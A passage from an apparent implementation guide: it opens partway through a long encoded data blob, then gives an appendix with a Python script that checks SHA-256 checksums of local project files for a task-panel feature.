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
~~~~

---

# Appendix C — checksum manifest

Run after writing every Appendix A file (and Appendix B). Checksums are
computed over LF-normalized bytes, so this passes even if an editor
wrote CRLF:

~~~~
python3 - <<'EOF'
import hashlib, pathlib
MANIFEST = {
    'src/data/asana_rich.py': 'f705da45076aafca93398faa8fc191ac1998b64cfcff8504572a7eea55b463f3',
    'src/services/task_vm.py': '963ea3be8670aeb9f9a034b294d01fb73d6e4a0a35d2c5118f32303ac18d3dd5',
    'src/services/task_web.py': '5a8f22306b3a27aa836a2c03fa45eb6685d5e66e09cd039afbbc0d2be88444ba',
    'src/ui/web/task_bridge.py': '369a8dcbf656ce738d530c28990594cdee1de8f34b47ad87c67c4eef4b6607ad',
    'src/ui/web/task_host.py': 'aad0bc6b627d1ebb7aa7994581fd07b8df198c886174183b244e7cad5e2491de',
    'migrations/058_task_extras_fields.sql': '0e3b44571ae1e49af58063242db9c6efb1ad57847196904600ab0cfb5f81bbfc',
    'assets/help/plan/task-panel-mirror.md': 'c82fc0394057fa0aba149e2131744be7f33e90599bcb31c18bb4e780f71b4c79',
    'tests/test_asana_rich.py': '93fac350b11868f663a478c1cdafdd51a71a416365176757061a1fac336e10fd',
    'tests/test_task_bridge.py': '2fb5c15de93480925b5a302aac6d652772a26b9111b78f77cdcc7f94c3cb2798',
    'tests/test_task_web_controller.py': '6520ca696456c4e7b90ed4f8768cc0448777651bde4c69f114f9a297bcd49de8',
    'web/src/task/Activity.jsx': 'da3abd772b56c06ab5ecba1ae952437d62cea8348a0a88d4c3635eaebd747a41',
    'web/src/task/AppsRow.jsx': '3e4c0e98f2bf933257f86dd0c2b611d07d2fb7ffbb751e3d571d26105fd52b63',
    'web/src/task/Description.jsx': '44f198afd2f5fba6db10ee0cc78b98ebf4a2cbeb4c61399feb24d5809d5b80d7',
    'web/src/task/FieldGrid.jsx': 'ea9700cea4022bf3af30ca584d782418b17fa5275179b5c7376b0a74caecc8e7',
    'web/src/task/Header.jsx': 'a9715734042f667eacbfc2fa101ee0eb2c92171c490f28dbe2ab203bd76d3738',
    'web/src/task/Subtasks.jsx': '5f7f809ace0042586fdc88855e7bf129eb821d6b8b59ae2e5b027f62b4a6ac2f',
    'web/src/task/TaskApp.jsx': 'd5ba4c5e236321ac98a5cc7da6d1d5b5d1875d05940161595a0f0148be575f0f',
    'web/src/task/avatars.jsx': 'd8d4ed7e0ef2d19835cbc38e9597fef36fe8d4b5b528ff4bc1b582cae4470588',
    'web/src/task/demo.js': '7458f8bd15f50523870a17190d42d76d8cdb63d41eeea3bd461d35cdfdbada7a',
    'web/src/task/shape.js': '9b2539575da6a34e8dcc4ce84e870f037f0be8e444094c9476242918f880a13e',
    'web/src/task/task.css': '5b93b968b885125d8530b96791c02108998a51ef85e4ff351cac1f919b29df55',
    'web/src/task/task.test.jsx': '3d11f842c70ab43f0281825ee31eb7bc083f34a8a0adf15dfab04c14c5d46324',
    'src/ui/web/dist/index.html': '591e78e3ed0088b163c4d7abc114e4c9284ce3fc5755e21c4550e36a33e214dd',
}
bad = []
for path, want in MANIFEST.items():
    data = pathlib.Path(path).read_bytes().replace(b'\r\n', b'\n')
    if not data.endswith(b'\n'):
        data += b'\n'
    got = hashlib.sha256(data).hexdigest()
    if got != want:
        bad.append((path, got))
print('ALL %d FILES OK' % len(MANIFEST) if not bad else '%d MISMATCHES' % len(bad))
for path, got in bad:
    print('MISMATCH:', path)
EOF
~~~~

Every file must be OK before continuing to §3. On mismatch: re-extract
that file from Appendix A. Do not hand-patch toward a checksum.
